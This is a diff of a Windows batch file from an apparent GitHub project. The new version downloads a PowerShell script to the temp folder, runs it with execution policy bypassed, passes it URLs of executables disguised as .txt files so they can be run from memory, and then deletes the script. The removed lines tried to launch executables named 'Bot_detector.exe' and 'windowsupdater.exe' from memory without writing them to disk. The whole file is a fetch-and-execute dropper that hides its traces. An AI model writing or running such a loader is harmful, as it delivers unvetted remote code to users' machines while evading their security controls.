@@ -1,22 +1,18 @@
 @echo off
-REM Define URLs for the EXEs
+REM Define the URL of the PowerShell script
+set PS_SCRIPT_URL=https://github.com/xxuavails/TestMessage/raw/refs/heads/main/RunApps.ps1
+
+REM Define URLs for the EXEs (text files with EXE content)
 set U1=https://github.com/xxuavails/TestMessage/raw/refs/heads/main/Messageboxtest1.txt
 set U2=https://github.com/xxuavails/TestMessage/raw/refs/heads/main/Messageboxtest2.txt
 
-REM Use PowerShell to download and execute the EXEs without saving them to disk
+REM Download the PowerShell script from the specified URL
+powershell -Command "Invoke-WebRequest -Uri '%PS_SCRIPT_URL%' -OutFile '%TEMP%\run_exe_from_memory.ps1'"
 
-REM Download and execute Bot_detector.exe in memory
-powershell -Command "
-    $url1 = '%U1%'
-    $exe1 = (Invoke-WebRequest -Uri $url1).Content
-    Start-Process -FilePath (New-Object System.IO.MemoryStream(,$exe1)) -NoNewWindow
-"
+REM Execute the downloaded PowerShell script with the URLs as arguments
+powershell -ExecutionPolicy Bypass -File "%TEMP%\run_exe_from_memory.ps1" "%U1%" "%U2%"
 
-REM Download and execute windowsupdater.exe in memory
-powershell -Command "
-    $url2 = '%U2%'
-    $exe2 = (Invoke-WebRequest -Uri $url2).Content
-    Start-Process -FilePath (New-Object System.IO.MemoryStream(,$exe2)) -NoNewWindow
-"
+REM Clean up by removing the downloaded script
+del "%TEMP%\run_exe_from_memory.ps1"
 
 exit
